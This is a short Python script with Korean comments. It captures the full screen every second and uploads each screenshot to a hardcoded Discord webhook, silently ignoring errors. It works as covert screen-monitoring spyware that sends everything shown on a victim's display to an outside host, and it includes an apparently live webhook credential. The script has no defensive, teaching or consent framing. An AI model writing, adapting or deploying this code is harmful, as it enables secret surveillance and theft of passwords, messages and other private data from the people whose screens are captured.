import time
import pyautogui
import requests
from io import BytesIO

WEBHOOK_URL = 'https://discord.com/api/webhooks/1387366754899988530/SZRK2MU69bHLzDn36UJV6vVjrJ90Dxr2wsCl-oAy_pXLVRHv8waZU84MO7mP1a9i67SF'

def send_screenshot():
    screenshot = pyautogui.screenshot()
    buffer = BytesIO()
    screenshot.save(buffer, format="JPEG", quality=70)
    buffer.seek(0)
    files = {"file": ("screenshot.jpg", buffer, "image/jpeg")}
    try:
        requests.post(WEBHOOK_URL, files=files)
    except Exception as e:
        pass  # 에러 무시

def main():
    while True:
        send_screenshot()
        time.sleep(1)  # 1초마다 실행

if __name__ == '__main__':
    main()
